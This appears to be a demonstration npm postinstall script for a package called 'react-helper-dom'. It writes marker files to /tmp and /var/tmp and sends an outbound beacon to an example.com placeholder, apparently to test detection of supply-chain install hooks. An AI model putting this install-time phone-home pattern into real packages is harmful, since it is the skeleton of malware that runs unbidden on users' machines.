const fs = require("fs");
const os = require("os");
const path = require("path");
const http = require("http");
const https = require("https");

function writeMarkerFiles() {
  const marker = [
    "hazmat-demo-marker=true",
    `pid=${process.pid}`,
    `host=${os.hostname()}`,
    `time=${new Date().toISOString()}`
  ].join("\n");

  const targets = [
    "/tmp/hazmat-demo-marker.txt",
    "/var/tmp/hazmat-demo-marker.txt"
  ];

  for (const filePath of targets) {
    try {
      fs.mkdirSync(path.dirname(filePath), { recursive: true });
      fs.writeFileSync(filePath, marker + "\n", "utf8");
      console.log(`[DEMO] marker_written=${filePath}`);
    } catch (err) {
      console.log(`[DEMO] marker_write_failed=${filePath} reason=${err.message}`);
    }
  }
}

function beaconOutbound() {
  const endpoint = process.env.HAZMAT_DEMO_ENDPOINT || "https://example.com/hazmat-beacon";
  const url = new URL(endpoint);
  const payload = JSON.stringify({
    demo: true,
    pkg: "react-helper-dom",
    phase: "postinstall",
    ts: Date.now()
  });

  const client = url.protocol === "http:" ? http : https;
  const req = client.request(
    {
      protocol: url.protocol,
      hostname: url.hostname,
      port: url.port || (url.protocol === "http:" ? 80 : 443),
      path: url.pathname + (url.search || ""),
      method: "POST",
      headers: {
        "content-type": "application/json",
        "content-length": Buffer.byteLength(payload)
      },
      timeout: 1500
    },
    (res) => {
      console.log(`[DEMO] beacon_status=${res.statusCode}`);
      res.resume();
    }
  );

  req.on("timeout", () => req.destroy(new Error("timeout")));
  req.on("error", (err) => {
    console.log(`[DEMO] beacon_error=${err.message}`);
  });
  req.write(payload);
  req.end();
}

writeMarkerFiles();
beaconOutbound();
